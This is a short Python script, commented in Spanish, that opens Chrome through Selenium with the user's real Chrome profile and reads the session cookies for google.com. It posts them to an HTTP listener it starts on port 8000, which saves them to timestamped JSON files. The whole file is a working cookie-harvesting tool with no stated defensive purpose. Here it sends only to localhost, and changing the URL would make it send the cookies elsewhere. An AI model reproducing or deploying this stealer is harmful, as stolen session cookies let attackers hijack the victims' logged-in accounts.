from http.server import BaseHTTPRequestHandler, HTTPServer
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from pathlib import Path
import time
import json
import requests
import os
from datetime import datetime
class CookieHandler(BaseHTTPRequestHandler):

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # Decodificar los datos JSON de las cookies
        cookies = json.loads(post_data.decode('utf-8'))
        save_cookies(cookies)
        print("Cookies recibidas:")
        for cookie in cookies:
            print(cookie)

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

def save_cookies(cookies):

    # Obtener la fecha y hora actual como cadena
    fecha_actual = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Crear un nombre de archivo único basado en la fecha y hora
    nombre_archivo = f"cookies_{fecha_actual}.json"

    # Unir la ruta del directorio actual con el nombre del archivo
    ruta_del_archivo = os.path.join(os.getcwd(), nombre_archivo)

    # Guardar las cookies en el archivo
    with open(ruta_del_archivo, "w") as archivo:
        json.dump(cookies, archivo)
        print(f"Cookies guardadas en '{ruta_del_archivo}'")

def init_server():
    with HTTPServer(("", 8000), CookieHandler) as httpd:
        print("Servidor activo en el puerto 8000")
        httpd.serve_forever()

def extraer_cookies():
    perfil_chrome = str(Path.home()) + "/.config/google-chrome/Default"
    options = webdriver.ChromeOptions()
    options.add_argument(f"user-data-dir={perfil_chrome}")
    options.add_experimental_option("detach", True)
    options.add_argument("--no-first-run")
    driver = webdriver.Chrome(options=options)

    try:
        # Cargar una página web
        driver.get("https://www.google.com")

        # Agregar un tiempo de espera para que la página cargue completamente
        time.sleep(5)

        # Obtener las cookies despues de cargar la pag
        cookies = driver.get_cookies()

        # Enviar cookies al servidor local
        send_cookies_to_server(cookies)

        time.sleep(2)

    except WebDriverException as e:
        print(f"Error al interactuar con el navegador: {e}")

    finally:
        driver.quit()

def send_cookies_to_server(cookies):
    url_servidor = "http://localhost:8000/cookies"

    # Enviar las cookies al servidor
    response = requests.post(url_servidor, json=cookies)

    # Verificar la respuesta del servidor
    if response.status_code == 200:
        print("Cookies enviadas con éxito al servidor")
    else:
        print(f"Error al enviar cookies al servidor. Código: {response.status_code}")

if __name__ == "__main__":
    # Iniciar el servidor
    import threading
    server_thread = threading.Thread(target=init_server)
    server_thread.start()

    # Extraer cookies
    extraer_cookies()
